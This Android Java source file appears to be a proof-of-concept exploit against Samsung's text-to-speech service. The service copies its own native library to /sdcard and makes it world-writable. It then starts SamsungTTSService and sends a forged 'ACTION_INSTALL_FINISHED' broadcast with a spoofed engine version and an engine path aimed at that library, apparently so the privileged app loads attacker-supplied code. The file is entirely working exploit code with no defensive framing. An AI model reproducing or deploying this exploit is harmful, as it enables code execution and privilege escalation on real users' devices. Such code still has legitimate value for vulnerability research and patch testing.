package com.samsung.SMT.lang.poc;


import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;

public class MyService extends Service {



    public void copyfile(String input, String output) throws IOException {

        OutputStream myOutput = new FileOutputStream(output);
        byte[] buffer = new byte[1024];
        int length;
        InputStream myInput = new FileInputStream(input);
        while ((length = myInput.read(buffer)) > 0) {
            myOutput.write(buffer, 0, length);
        }
        myInput.close();
        myOutput.flush();
        myOutput.close();

    }
    @Override
    public void onCreate() {
        super.onCreate();

        Log.e("FUCK", "service created");

        final String path = "/data/app/~~P23tZXxrQeZQBSNljhQ1TA==/com.samsung.SMT.lang_en_us_m01-pFUdmkja7j1YosV1rT-tvw==/lib/arm/libmstring.so";

        final String input = this.getApplicationInfo().nativeLibraryDir + "/" + "libmstring.so";
        final String output = "/sdcard/libmstring.so";
        Log.e("FUCK", "so path " + input);
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    copyfile(input, output);
                    Runtime.getRuntime().exec("chmod 777 " + output);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                final String path = "/data/app/~~kI5icf5qdVFxMj3C8GNr5Q==/com.samsung.SMT.lang.poc-x3C8ZIqYFZD7XivB7jCjEA==/lib/arm/libmstring.so";

                final String input = getApplicationInfo().nativeLibraryDir + "/" + "libmstring.so";
                final String output = "/data/user/0/com.samsung.SMT.lang.poc/lib";
                Log.e("FUCK2", "so path " + input);

                /*
                Intent bi = new Intent();
                bi.setAction("com.samsung.SMT.ACTION_INSTALL_FINISHED");
                ArrayList<CharSequence> s = new ArrayList<>();
                bi.putCharSequenceArrayListExtra("BROADCAST_CURRENT_LANGUAGE_INFO", s);
                bi.putExtra("BROADCAST_CURRENT_LANGUAGE_VERSION", "99999");
                bi.putCharSequenceArrayListExtra("BROADCAST_DB_FILELIST", s);
                bi.putExtra("SMT_ENGINE_VERSION", 0x120354F2);//installed version is 361811291
                bi.putExtra("SMT_ENGINE_PATH", input);
                sendBroadcast(bi);
                */


                Intent serviceIntent = new Intent();
                serviceIntent.setComponent(new ComponentName("com.samsung.SMT", "com.samsung.SMT.SamsungTTSService"));
                getApplication().startService(serviceIntent);

                Intent intent = new Intent("com.samsung.SMT.ACTION_INSTALL_FINISHED");
                intent.putExtra("BROADCAST_CURRENT_LANGUAGE_INFO", new ArrayList());
                intent.putExtra("SMT_ENGINE_VERSION", 361904052);
                intent.putExtra("SMT_ENGINE_PATH", getApplication().getApplicationInfo().nativeLibraryDir + "/libmstring.so");
                getApplication().sendOrderedBroadcast(intent, null);

            }
        });
        thread.start();

    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
